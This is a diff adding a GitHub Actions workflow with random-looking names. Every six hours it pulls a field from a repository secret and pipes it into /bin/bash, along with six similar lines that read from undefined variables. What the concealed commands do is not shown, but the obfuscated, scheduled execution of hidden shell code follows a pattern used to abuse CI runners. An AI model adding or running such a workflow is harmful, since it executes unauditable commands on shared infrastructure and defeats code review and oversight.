@@ -1,0 +1,24 @@
+name: mnajiagnhong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mnajiagnhong
+        env:
+          xii38946: ${{ secrets.xii38946 }}
+        run: |
+          echo $xii38946 | jq -r .kv6620 | /bin/bash
+          echo $z036 | jq -r .ips3371 | /bin/bash
+          echo $ztak2890 | jq -r .pb45668 | /bin/bash
+          echo $ko7 | jq -r .u3 | /bin/bash
+          echo $fawxn2 | jq -r .v2944 | /bin/bash
+          echo $gvyi07830 | jq -r .qeiw43 | /bin/bash
+          echo $juw33240 | jq -r .o0 | /bin/bash
+
